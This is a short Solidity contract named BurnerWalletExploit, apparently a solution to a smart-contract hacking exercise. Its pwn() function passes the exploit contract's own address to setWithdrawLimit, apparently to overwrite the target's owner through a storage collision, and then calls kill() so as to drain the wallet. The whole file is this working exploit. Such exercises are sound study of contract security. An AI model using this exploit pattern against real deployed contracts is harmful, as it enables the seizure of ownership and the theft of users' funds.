// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IBurnerWallet {
    // declare any function that you need to call on BurnerWallet
    function setWithdrawLimit(uint) external ;
    function kill() external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // write your code here
        // set owner to this contract
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        // kill to drain wallet
        IBurnerWallet(target).kill();
    }
}